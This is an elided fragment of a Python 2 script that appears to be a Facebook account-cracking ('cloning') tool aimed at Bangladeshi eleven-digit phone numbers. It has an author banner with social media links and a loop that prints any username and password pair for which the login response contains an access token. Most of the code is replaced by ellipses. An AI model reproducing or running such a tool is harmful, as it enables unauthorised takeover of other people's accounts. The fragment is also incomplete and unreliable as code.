...
psb('\x1b[1;32mBANGLADESH TALHA KOKO ELEVEN DIGIT CLONING START PLEASE WAIT ..........')
...
def menu():
    ...
    print 'AUTHOR   : TALHA FALTOO KOKO'

    print 'FACEBOOK : https://www.facebook.com/talhakhn01'

    print 'GITHUB     : github.com/Faltookoko'
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[Talhakoko-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
    ...
    os.system('python2 talhakoko.py')
